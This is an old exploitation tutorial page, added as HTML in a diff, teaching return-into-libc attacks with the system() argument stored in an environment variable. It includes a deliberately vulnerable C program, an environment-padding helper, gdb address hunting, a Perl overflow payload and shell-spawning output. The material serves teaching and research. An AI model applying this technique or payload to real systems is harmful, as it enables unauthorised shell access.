@@ -1,0 +1,247 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"
+           "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<meta name="GENERATOR" content="TtH 3.05">
+ <style type="text/css"><!--
+ td div.comp { margin-top: -0.6ex; margin-bottom: -1ex;}
+ td div.comb { margin-top: -0.6ex; margin-bottom: -.6ex;}
+ td div.hrcomp { line-height: 0.9; margin-top: -0.8ex; margin-bottom: -1ex;}
+ td div.norm {line-height:normal;}
+ span.roman {font-family: serif; font-style: normal; font-weight: normal;} 
+ span.overacc2 {position: relative;  left: .8em; top: -1.2ex;}
+ span.overacc1 {position: relative;  left: .6em; top: -1.2ex;} --></style>
+
+ 
+<title> Using Environment for returning into Lib C</title>
+ 
+<h1 align="center">Using Environment for returning into Lib C </h1>
+
+<h3 align="center">Elie aka Lupin Bursztein<br />(elie@bursztein.net) </h3>
+
+<h3 align="center">Feb 26, 2002
+</h3>
+
+
+<h1>Contents </h1><a href="#tth_sEc1"
+>1&nbsp; introduction</a><br />
+<a href="#tth_sEc2"
+>2&nbsp; A vulnerable program</a><br />
+<a href="#tth_sEc3"
+>3&nbsp; Using the environment</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc3.1"
+>3.1&nbsp; NOP like</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc3.2"
+>3.2&nbsp; Program</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc3.3"
+>3.3&nbsp; Demonstration</a><br />
+<a href="#tth_sEc4"
+>4&nbsp; Writing the exploit</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc4.1"
+>4.1&nbsp; Gathering data</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc4.2"
+>4.2&nbsp; Exploit Code</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;<a href="#tth_sEc4.3"
+>4.3&nbsp; Exploitation</a><br />
+<a href="#tth_sEc5"
+>5&nbsp; conclusion</a><br />
+
+<br><br><font color=red><b>Errata</b></font> : Since the technique still working the system() call does'nt work with the new shell so 
+it's needed to use the execve function. I will release a new paper on it soon. 
+(Thank's to Korty for pointing this out).
+
+ <h2><a name="tth_sEc1">
+1</a>&nbsp;&nbsp;introduction</h2>
+
+<p>
+The scope of this article is to explain how to use the environment variables to successfully exploit a buffer overflow with a return into lib C. This approach has many advantages in particular :
+
+<ul><p>
+<li> The capability of chaining return because you are not limited by the number of arguments you can pass.</li>
+<p>
+<li> A flexibility for the return address because you don't have to point to an address but to a range of it.</li>
+</ul>
+
+ <h2><a name="tth_sEc2">
+2</a>&nbsp;&nbsp;A vulnerable program</h2>
+Here is a simple program designed to demonstrate this method
+
+<pre>
+int foo(char *string)
+{
+  char vuln[25];
+
+  strcpy(vuln, string);
+  return 42;
+}
+
+int main(int ac, char **av)
+{
+  foo(av[1]);
+  return 42;
+}
+
+</pre>
+As you can see there is no place to put the system() argument in this program. The environment will consequently be used to store it.
+
+ <h2><a name="tth_sEc3">
+3</a>&nbsp;&nbsp;Using the environment</h2>
+In order to put the argument for the return into lib C in the environment one needs some 'room' because the environment variables are not exactly at the same place when you run a program. A \x90-like is needed for the return into lib C.
+
+     <h3><a name="tth_sEc3.1">
+3.1</a>&nbsp;&nbsp;NOP like</h3>
+For the system() function the string ``/bin/sh'' is the same than '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/bin/sh'. In the return into lib C the ' ' char which is \x20 will act has NOP for the shellcode. It will multiply the chances of success.
+
+     <h3><a name="tth_sEc3.2">
+3.2</a>&nbsp;&nbsp;Program</h3>
+It is easy to write a simple program to put the command directly into the environment and to spawn a shell.
+Here is one
+
+<pre>
+#include &lt;string.h&#62;
+#include &lt;stdlib.h&#62;
+#include &lt;stdio.h&#62;
+
+int main(int ac, char **av)
+{
+  char command[500];
+  int len;
+  int i;
+
+  memset (command, '\0', 500);
+  len = strlen(av[1]);
+  //filling with " " which is the equivalent for the return of the \x90 of shellcode
+  for (i = 0; i &lt;= 500 - len; i++)
+    command[i] = ' ';
+  //filling with the command equivalent to the shellcode :)
+  strcat(command, av[1]);
+  setenv("RCL", command, 1);
+  system("/bin/bash");
+  return 42;
+}
+
+</pre>
+
+     <h3><a name="tth_sEc3.3">
+3.3</a>&nbsp;&nbsp;Demonstration</h3>
+The /bin/sh command is put into the environment.
+
+<pre>
+[lupin@saphyr return-into-libc]$ ./env /bin/sh
+[lupin@saphyr return-into-libc]$ export
+declare -x BROWSER="kfmclient openProfile webbrowsing"
+declare -x COLORTERM=""
+declare -x DISPLAY=":0"
+declare -x GTK_RC_FILES="/etc/gtk/gtkrc:/home/lupin/.gtkrc"
+
+&lt;-snipe-&#62;
+
+declare -x RCL="
+
+
+                           /bin/sh"
+declare -x SECURE_LEVEL="0"
+
+&lt;- snipe -&#62;
+
+[lupin@saphyr return-into-libc]$
+
+</pre>
+One can see the command passed to the program (/bin/sh) is in the environment with a lot of spaces.
+
+<p>
+ <h2><a name="tth_sEc4">
+4</a>&nbsp;&nbsp;Writing the exploit</h2> 
+
+     <h3><a name="tth_sEc4.1">
+4.1</a>&nbsp;&nbsp;Gathering data</h3>
+Three informations are required to exploit successfully the vulnerable program: 
+
+<ol type="1"><p>
+<li> Number of chars before overwriting the return address.</li>
+<p>
+<li> Address of the system() function.</li>
+<p>
+<li> Address of the environment variable.</li>
+</ol>
+The only part of gathering data explained here is how to get the environment variable address. The rest is old news.
+As explained previously the variable has been filled with a lot of \x20. Let's run the program and inspect the memory
+with gdb (put a break point to main in order to stop at the beginning of the program).
+The result is
+
+<pre>
+Breakpoint 1, 0x08048496 in main ()
+(gdb) p system
+$1 = {&lt;text variable, no debug info&#62;} 0x40073440 &lt;system&#62;
+(gdb) x/20x $esp
+0xbffff5d0:     0x08049538      0x08049640      0xbffff618      0x400405b0
+0xbffff5e0:     0x00000001      0xbffff644      0xbffff64c      0x080482fa
+0xbffff5f0:     0x08048500      0x00000000      0xbffff618      0x4004059a
+0xbffff600:     0x00000000      0xbffff64c      0x4015b9e0      0x40015638
+0xbffff610:     0x00000001      0x08048360      0x00000000      0x08048381
+
+&lt;- snipe -&#62;
+
+(gdb)
+0xbffff800:     0x72756540      0x4f48006f      0x414e5453      0x733d454d
+0xbffff810:     0x79687061      0x43520072      0x20203d4c      0x20202020
+0xbffff820:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff830:     0x20202020      0x20202020      0x20202020      0x20202020
+0xbffff840:     0x20202020      0x20202020      0x20202020      0x20202020
+...
+
+</pre>
+Let's pick an address in the middle of the \x20.
+
+     <h3><a name="tth_sEc4.2">
+4.2</a>&nbsp;&nbsp;Exploit Code</h3>
+The last thing to do is to write the exploit and test it. I wrote it in perl
+
+<pre>
+#making the overflow
+$over = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+#giving the system() adress to make the return into libc
+# 0x40073440 -&#62; 40 34 07 40
+$retaddr = "\x40\x34\x07\x40";
+#giving a dummy return adress to our function
+$dummy = "FAKE";
+#giving the adress of our env variable has arg
+#0xbffff870
+$arg1 = "\x70\xf8\xff\xbf";
+#Smash it !!!
+print $over;
+#print "BBBB";
+print $retaddr;
+print $dummy;
+print $arg1;
+
+</pre>
+
+     <h3><a name="tth_sEc4.3">
+4.3</a>&nbsp;&nbsp;Exploitation</h3>
+The exploit result is
+
+<pre>
+[lupin@saphyr return-into-libc]$ ./vul `perl exploit.pl`
+sh-2.05$ ps afx
+  PID TTY      STAT   TIME COMMAND
+    9 ?        SW     0:00 [kupdated]
+    8 ?        SW     0:00 [bdflush]
+    7 ?        SW     0:00 [kreclaimd]
+    6 ?        SW     0:00 [kswapd]
+&lt;- snipe -&#62;
+2206 pts/1    S      0:00  |   \_ /bin/bash
+ 2415 pts/1    S      0:00  |       \_ ./env /bin/sh
+ 2416 pts/1    S      0:00  |           \_ /bin/bash
+ 2527 pts/1    S      0:00  |               \_ ./vul AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@4?@FAKEpøÿ¿
+ 2528 pts/1    S      0:00  |                   \_ /bin/sh
+ 2530 pts/1    R      0:00  |                       \_ ps afx
+
+</pre>
+
+<p>
+Et voila :).
+
+ <h2><a name="tth_sEc5">
+5</a>&nbsp;&nbsp;conclusion</h2>
+The use of environment variables in the return into lib C technique will make it more easy to do. With this flexibility it's possible to write a new range of exploits using the return into lib C. 
+</html>
